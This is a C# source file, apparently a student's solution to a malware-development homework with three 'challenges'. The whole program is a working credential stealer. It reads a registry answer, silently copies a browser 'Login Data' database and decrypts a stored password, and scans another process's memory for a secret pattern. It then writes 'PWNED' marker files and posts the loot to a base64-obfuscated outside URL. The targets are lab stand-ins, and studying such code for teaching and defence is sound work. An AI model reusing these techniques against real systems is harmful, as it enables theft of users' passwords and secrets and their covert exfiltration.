using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Data.SQLite;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
class Program
{
    const string SECRET = "wwfZJQ7nU0GIYcQGcSxO8npXCRTZaFzi";
    const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    const int MEM_COMMIT = 0x1000;
    const int PAGE_READWRITE = 0x04;

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION
    {
        public IntPtr BaseAddress;
        public IntPtr AllocationBase;
        public uint AllocationProtect;
        public ulong RegionSize;
        public uint State;
        public uint Protect;
        public uint Type;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern UIntPtr VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, UIntPtr dwLength);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr LoadLibrary(string libname);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);
    // put dll into the memory
    static void PreloadSqlite()
    {
        try
        {
            string tempFolder = System.IO.Path.GetTempPath();
            // 
            string dllPath = System.IO.Path.Combine(tempFolder, "SQLite.Interop.dll");

            // check dll is loaded to memory or not
            if (GetModuleHandle("SQLite.Interop.dll") != IntPtr.Zero) return;

            if (!System.IO.File.Exists(dllPath))
            {
                var allResourceNames = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceNames();

                // tolower
                string resourceName = allResourceNames.FirstOrDefault(n => n.ToLower().Contains("sqlite.interop.dll"));

                if (string.IsNullOrEmpty(resourceName))
                {
                    // just for debug
                    Console.WriteLine("[!] Resource match failed. Available: " + string.Join(", ", allResourceNames));
                    return;
                }

                Console.WriteLine($"[+] Extracting: {resourceName}");

                using (var stream = System.Reflection.Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName))
                using (var fileStream = System.IO.File.Create(dllPath))
                {
                    stream.CopyTo(fileStream);
                }
            }

            // load dll, we can learn this technique from homewaork (malware development)
            IntPtr hModule = LoadLibrary(dllPath);
            if (hModule == IntPtr.Zero)
            {
                Console.WriteLine($"[!] LoadLibrary failed: {Marshal.GetLastWin32Error()}");
            }
            else
            {
                Console.WriteLine($"[+] Native Library Loaded: {hModule}");
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[!] Preload Error: {ex.Message}");
            System.IO.File.WriteAllText(@"C:\Users\Public\PRELOAD_ERROR.txt", ex.ToString());
        }
    }


    static int FindProcessIdByName(string processName)
    {
        foreach (Process proc in Process.GetProcessesByName(processName))
        {
            return proc.Id;
        }
        return -1;
    }

    static string FromBase64(string b64)
    {
        return Encoding.UTF8.GetString(Convert.FromBase64String(b64));
    }

    static string ScanProcessMemory(string processName, string pattern)
    {
        int pid = FindProcessIdByName(processName);

        if (pid == -1)
        {
            Console.WriteLine($"Process {processName} not found.");
            return null;
        }

        IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

        if (processHandle == IntPtr.Zero)
        {
            Console.WriteLine($"Could not open process: {pid}");
            return null;
        }

        IntPtr address = IntPtr.Zero;
        MEMORY_BASIC_INFORMATION memoryInfo;
        Regex regex = new Regex(pattern);

        try
        {
            while (VirtualQueryEx(processHandle, address, out memoryInfo, (UIntPtr)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != UIntPtr.Zero)
            {
                if (memoryInfo.State == MEM_COMMIT && memoryInfo.Protect == PAGE_READWRITE)
                {
                    byte[] buffer = new byte[memoryInfo.RegionSize];
                    if (ReadProcessMemory(processHandle, address, buffer, (UIntPtr)buffer.Length, out IntPtr bytesRead) && bytesRead.ToInt64() > 0)
                    {
                        string bufferString = System.Text.Encoding.ASCII.GetString(buffer);
                        Match match = regex.Match(bufferString);
                        if (match.Success)
                        {
                            return match.Value;
                        }
                    }
                    else
                    {
                        Console.WriteLine($"Failed to read memory at address {address.ToString("X")}");
                    }
                }
                address = new IntPtr(address.ToInt64() + (long)memoryInfo.RegionSize);
            }
        }
        finally
        {
            CloseHandle(processHandle);
        }

        return null;
    }

    static byte[] HexStringToByteArray(string hex)
    {
        return Enumerable.Range(0, hex.Length / 2)
            .Select(x => Convert.ToByte(hex.Substring(x * 2, 2), 16))
            .ToArray();
    }

    static byte[] DecryptPassword(byte[] encryptedPassword, byte[] key, byte[] iv)
    {
        using (Aes aesAlg = Aes.Create())
        {
            aesAlg.Key = key;
            aesAlg.IV = iv;
            aesAlg.Mode = CipherMode.CBC;
            aesAlg.Padding = PaddingMode.PKCS7;

            ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

            using (System.IO.MemoryStream msDecrypt = new System.IO.MemoryStream(encryptedPassword))
            {
                using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                {
                    using (System.IO.StreamReader srDecrypt = new System.IO.StreamReader(csDecrypt))
                    {
                        return Encoding.UTF8.GetBytes(srDecrypt.ReadToEnd());
                    }
                }
            }
        }
    }

    static string Challenge1()
    {
        string registryPath = FromBase64("U09GVFdBUkVcQk9NQkU=");

        try
        {
            using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath))
            {
                if (key == null)
                {
                    Console.WriteLine($"Registry key {registryPath} not found.");
                    return null;
                }

                object value = key.GetValue("answer_1");

                if (value == null)
                {
                    Console.WriteLine($"answer_1 not found in registry key {registryPath}.");
                    return null;
                }
                //System.IO.File.WriteAllText(@"C:\Users\Public\Log.txt", value.ToString());
                return value.ToString();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error reading registry: {ex.Message}");
            return null;
        }
    }

    static string Challenge2()
    {
        string decryptedPassword = null;
        //string originalPath = "C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data";
        string originalPath = FromBase64("QzpcVXNlcnNcYm9tYmVcQXBwRGF0YVxMb2NhbFxiaHJvbWVcTG9naW4gRGF0YQ==");
        string tempPath = System.IO.Path.GetTempFileName();
        //Console.WriteLine(tempPath);

        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = $"/c copy \"{originalPath}\" \"{tempPath}\" /Y";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;

            using (Process proc = Process.Start(psi))
            {
                proc.WaitForExit();
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Copy failed: {ex.Message}");
            return "Failed to copy database";
        }


        //string dbPath = "C:\\Users\\bombe\\AppData\\Local\\bhrome\\Login Data";
        string dbPath = tempPath;
        byte[] key = Encoding.UTF8.GetBytes(SECRET);

        using (SQLiteConnection conn = new SQLiteConnection($"Data Source={dbPath};Version=3;"))
        {
            conn.Open();
            using (SQLiteCommand cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
            {
                using (SQLiteDataReader reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string originUrl = reader.GetString(0);
                        string username = reader.GetString(1);

                        if (username != FromBase64("Ym9tYmU=")) continue;

                        byte[] encryptedPassword = HexStringToByteArray(reader.GetString(2));

                        try
                        {
                            // Assuming the format of encryptedPassword is iv | ciphertext
                            byte[] iv = new byte[16]; // AES block size for CBC mode is 16 bytes
                            byte[] ciphertext = new byte[encryptedPassword.Length - iv.Length];

                            Buffer.BlockCopy(encryptedPassword, 0, iv, 0, iv.Length);
                            Buffer.BlockCopy(encryptedPassword, iv.Length, ciphertext, 0, ciphertext.Length);

                            byte[] decryptedPasswordBytes = DecryptPassword(ciphertext, key, iv);
                            decryptedPassword = Encoding.UTF8.GetString(decryptedPasswordBytes);
                        }
                        catch (Exception)
                        {
                            decryptedPassword = "Failed to decrypt";
                        }
                        //System.IO.File.WriteAllText(@"C:\Users\Public\Log.txt", decryptedPassword);
                        return decryptedPassword;
                    }
                }
            }
        }

        try { System.IO.File.Delete(tempPath); } catch { }

        return decryptedPassword;
    }

    static string Challenge3()
    {
        string processName = "bsass";
        string pattern = FromBase64("Qk9NQkVfTUFMX0ZMQUdfXHd7MzJ9");
        //System.IO.File.WriteAllText(@"C:\Users\Public\Log.txt", pattern);

        return ScanProcessMemory(processName, pattern);
    }

    private static async Task SendAnswerToServer(string jsonPayload)
    {
        using (HttpClient client = new HttpClient())
        {
            StringContent content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");

            try
            {
                //HttpResponseMessage response = await client.PostAsync("https://submit.bombe.top/submitMalAns", content);
                string url = FromBase64("aHR0cHM6Ly9zdWJtaXQuYm9tYmUudG9wL3N1Ym1pdE1hbEFucw==");
                HttpResponseMessage response = await client.PostAsync(url, content);
                response.EnsureSuccessStatusCode();
                string responseBody = await response.Content.ReadAsStringAsync();
                Console.WriteLine($"Response: {responseBody}");
            }
            catch (HttpRequestException e)
            {
                Console.WriteLine($"Request error: {e.Message}");
            }
        }
    }

    static async Task Main()
    {

        PreloadSqlite();
        System.IO.File.WriteAllText(@"C:\Users\Public\first_PWNED.txt", "Payload Started: " + DateTime.Now);
        string answer_1 = Challenge1();
        Console.WriteLine(answer_1);
        string answer_2 = Challenge2();
        Console.WriteLine(answer_2);
        string answer_3 = Challenge3();
        Console.WriteLine(answer_3);

        var payload = new
        {
            answer_1 = answer_1,
            answer_2 = answer_2,
            answer_3 = answer_3,
            secret = SECRET
        };

        string json = JsonConvert.SerializeObject(payload);

        System.IO.File.WriteAllText(@"C:\Users\Public\PWNED.txt", json);


        await SendAnswerToServer(JsonConvert.SerializeObject(
            new
            {
                answer_1 = answer_1,
                answer_2 = answer_2,
                answer_3 = answer_3,
                secret = SECRET
            }
        ));
    }
}